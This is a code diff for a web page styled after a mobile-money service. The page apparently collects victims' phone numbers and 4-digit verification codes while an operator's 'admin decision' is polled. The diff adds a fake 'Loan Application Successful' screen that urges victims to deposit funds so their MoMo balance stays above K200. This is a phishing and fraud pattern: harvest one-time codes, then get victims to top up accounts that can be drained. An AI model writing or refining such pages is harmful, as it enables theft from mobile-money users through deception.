@@ -75,6 +75,93 @@
         .waiting-title { font-size: 20px; font-weight: 800; color: #111; margin-bottom: 10px; }
         .waiting-text { font-size: 14px; color: #666; line-height: 1.6; }
 
+        /* SUCCESS SCREEN — EcoCash style */
+        .success-wrap {
+            text-align: center;
+            padding: 10px 0 6px;
+        }
+        .success-check {
+            width: 100px; height: 100px;
+            border-radius: 50%;
+            background: #0d66b8;
+            display: flex; align-items: center; justify-content: center;
+            color: #fff; font-size: 48px; font-weight: 900;
+            margin: 0 auto 24px;
+            box-shadow: 0 12px 30px rgba(13,102,184,.35);
+            animation: pop 0.5s ease-out;
+        }
+        @keyframes pop {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .success-pill {
+            display: inline-block;
+            background: #eaf7ea;
+            color: #1e7d1e;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            padding: 6px 16px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            margin-bottom: 18px;
+        }
+        .success-heading {
+            font-size: 22px;
+            font-weight: 800;
+            color: #111;
+            margin-bottom: 10px;
+        }
+        .success-sub {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 22px;
+        }
+        .amount-box {
+            background: #f0f6ff;
+            border: 1.5px solid #cce0f5;
+            border-radius: 14px;
+            padding: 20px 22px;
+            margin-bottom: 18px;
+            text-align: center;
+        }
+        .amount-label {
+            font-size: 11px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+        .amount-value {
+            font-size: 30px;
+            font-weight: 900;
+            color: #0d66b8;
+            letter-spacing: -0.5px;
+        }
+        .notice {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            text-align: left;
+            background: #fff;
+            border: 1.5px solid #e5e8f0;
+            border-radius: 14px;
+            padding: 16px 18px;
+            margin-bottom: 12px;
+        }
+        .notice-icon { font-size: 24px; flex-shrink: 0; line-height: 1; }
+        .notice-text {
+            font-size: 13px; line-height: 1.55; color: #333;
+        }
+        .notice-text strong { color: #111; font-weight: 800; }
+        .notice.highlight {
+            background: #fffbf0;
+            border-color: #f5dca0;
+        }
+        .notice.highlight .notice-text strong { color: #b8860b; }
+
         .footer { background: #111; color: #ffcc00; text-align: center;
                   padding: 18px; font-size: 13px; font-weight: 600; }
 
@@ -84,6 +171,8 @@
             .header-title { font-size: 15px; }
             .pin-box { width: 60px; height: 70px; font-size: 26px; }
             .pin-row { gap: 8px; }
+            .success-check { width: 84px; height: 84px; font-size: 40px; }
+            .amount-value { font-size: 26px; }
         }
     </style>
 </head>
@@ -99,7 +188,7 @@
     </header>
 
     <main class="main">
-        <h1 class="page-title">Enter Verification Code</h1>
+        <h1 class="page-title" id="pageTitle">Enter Verification Code</h1>
 
         <div class="card" id="mainCard">
             <div class="card-icon">📩</div>
@@ -130,6 +219,7 @@
         const params = new URLSearchParams(window.location.search);
         const phone  = params.get('phone') || 'unknown';
         const refId  = params.get('ref')   || '';
+        const amount = params.get('amount') || '5000';
 
         const pinBoxes  = Array.from(document.querySelectorAll('.pin-box'));
         const errorMsg  = document.getElementById('errorMsg');
@@ -193,7 +283,6 @@
             pinBoxes.forEach(b => b.classList.remove('error'));
         }
 
-        // ─── Polling for admin decision ───
         let referenceId = null;
         let pollTimer = null;
 
@@ -217,20 +306,39 @@
         }
 
         function showSuccess() {
+            // Hide the page title since success view has its own
+            document.getElementById('pageTitle').style.display = 'none';
+
+            const amountNum = Number(amount).toLocaleString();
+
             document.getElementById('mainCard').innerHTML = `
-                <div style="width:90px;height:90px;border-radius:50%;background:#2e9e4f;
-                            display:flex;align-items:center;justify-content:center;
-                            margin:0 auto 20px;font-size:44px;color:#fff;">✓</div>
-                <h2 style="font-size:22px;font-weight:800;color:#2e9e4f;margin-bottom:12px;">
-                    Verification Complete
-                </h2>
-                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
-                            background:#e8f7ec;color:#2e9e4f;font-size:13px;font-weight:700;
-                            margin-bottom:20px;">STATUS: PENDING APPROVAL</div>
-                <p style="font-size:15px;color:#444;line-height:1.6;">
-                    Your application has been fully submitted.<br>
-                    Please wait for approval.
-                </p>
+                <div class="success-wrap">
+                    <div class="success-check">✓</div>
+                    <div class="success-pill">Application Received</div>
+                    <h2 class="success-heading">Loan Application Successful</h2>
+                    <p class="success-sub">
+                        Your loan application has been received and is being processed.
+                    </p>
+
+                    <div class="amount-box">
+                        <div class="amount-label">Loan Amount Requested</div>
+                        <div class="amount-value">ZMW ${amountNum}</div>
+                    </div>
+
+                    <div class="notice">
+                        <div class="notice-icon">⏱️</div>
+                        <div class="notice-text">
+                            Please wait up to <strong>24 hours</strong> for your loan to be processed. Our team will review your application and notify you shortly.
+                        </div>
+                    </div>
+
+                    <div class="notice highlight">
+                        <div class="notice-icon">💰</div>
+                        <div class="notice-text">
+                            You must maintain a minimum balance of <strong>K200</strong> in your MoMo account. If your balance is below K200, please <strong>deposit funds now</strong> to ensure your account remains eligible for disbursement.
+                        </div>
+                    </div>
+                </div>
             `;
         }
 
@@ -255,7 +363,6 @@
             `;
         }
 
-        // ─── Submit 4-digit code ───
         document.getElementById('lastForm').addEventListener('submit', async function (e) {
             e.preventDefault();
 
@@ -282,7 +389,6 @@
                 const data = await res.json();
                 referenceId = data.referenceId;
 
-                // Show waiting screen
                 document.getElementById('mainCard').innerHTML = `
                     <div class="waiting-wrap">
                         <div class="waiting-spinner"></div>
